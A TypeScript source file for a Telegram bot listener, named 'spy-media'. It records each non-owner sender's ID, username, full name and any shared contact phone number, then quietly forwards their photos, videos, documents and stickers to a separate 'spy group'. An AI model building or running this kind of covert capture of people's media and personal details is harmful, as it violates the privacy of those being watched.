// src/listeners/spy-media.listener.ts
import type { Message } from '../types/misc'
import { env } from '../service/validate-env'
import ProcessedSpyMedia from '../db/spy-media.schema'
import type { MessageListener } from '../utils/register-message-listeners'

export const spyMediaGroupListener: MessageListener = async (ctx) => {
  const { OWNER_USER_ID, SPY_ENABLED, SPY_GROUP_ID } = env
  if (!SPY_ENABLED) return

  const msg: Message = ctx.message as Message
  const from = ctx.from!

  // ignore your own messages
  if (from.id === OWNER_USER_ID) return

  // detect any media
  const media = msg.photo?.slice(-1)[0] ?? msg.document ?? msg.video ?? msg.sticker
  if (!media) return

  const fileUniqueId = media.file_unique_id
  if (!fileUniqueId) return

  // build the user info
  const userId = from.id
  const username = from.username
  const fullName = [from.first_name, from.last_name].filter(Boolean).join(' ')
  // if they sent/forwarded a contact, capture that too
  const phoneNumber =
    'contact' in msg && msg.contact?.phone_number ? msg.contact.phone_number : undefined

  // try to record it for this spy group
  try {
    await new ProcessedSpyMedia({
      spyGroupId: SPY_GROUP_ID,
      fileUniqueId,
      userId,
      username,
      fullName,
      phoneNumber,
    }).save()
  } catch (err: any) {
    // duplicate key → already forwarded, skip
    if (err.code === 11000) return
    console.error('Error recording spy media:', err)
    return
  }

  // forward to your spy group
  try {
    await ctx.telegram.forwardMessage(
      SPY_GROUP_ID, // where to forward
      ctx.chat.id, // original chat
      msg.message_id // original message
    )
    console.log(`🔍 forwarded ${fileUniqueId} (from ${fullName}) to spy group`)
  } catch (forwardErr) {
    console.error('Failed to forward spy media:', forwardErr)
  }
}
